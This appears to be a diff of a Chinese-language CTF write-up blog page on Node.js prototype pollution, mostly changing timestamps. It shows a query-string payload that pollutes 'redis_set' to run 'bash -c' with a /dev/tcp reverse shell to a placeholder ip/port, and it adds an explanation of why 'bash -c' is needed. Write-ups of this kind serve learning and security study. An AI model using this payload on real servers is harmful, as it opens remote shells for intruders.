@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683426171520-63fa6be1-39b7-446d-8fc7-98f8d3e0a425.png">
 <meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683427463745-906d989e-5129-4618-98ae-64fc1c6c5efb.jpeg">
 <meta property="article:published_time" content="2023-05-09T03:41:48.000Z">
-<meta property="article:modified_time" content="2023-05-09T12:14:06.834Z">
+<meta property="article:modified_time" content="2023-05-09T15:38:49.638Z">
 <meta property="article:author" content="Z1d10t">
 <meta property="article:tag" content="Fast destruct">
 <meta property="article:tag" content="nodejs 原型链污染">
@@ -232,7 +232,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-05-09 11:41:48 / 修改时间：20:14:06" itemprop="dateCreated datePublished" datetime="2023-05-09T11:41:48+08:00">2023-05-09</time>
+      <time title="创建时间：2023-05-09 11:41:48 / 修改时间：23:38:49" itemprop="dateCreated datePublished" datetime="2023-05-09T11:41:48+08:00">2023-05-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -323,7 +323,7 @@
 <p>则ba.redis_se被污染</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?token=__proto__&amp;key=redis_set&amp;var=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>后来又看到如果直接<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>会报错 赛后没环境没法验证 </p>
+<p>解释一下为什么要用 <code>bash -c</code> 由于我们是在外部运行shell指令，所以他默认是不会识别我们的<code>bash -i</code>反弹shell的，<code>bash -c</code>保证了命令使用<code>bash shell</code>去执行</p>
 <p>反弹shell部分用url编码一下</p>
 <p><code>bash -c</code>就是将后面字符串当作命令读入执行 然后输出  </p>
 <h1 id="it’s-time"><a href="#it’s-time" class="headerlink" title="it’s time"></a>it’s time</h1><p>经典flask的ssti</p>
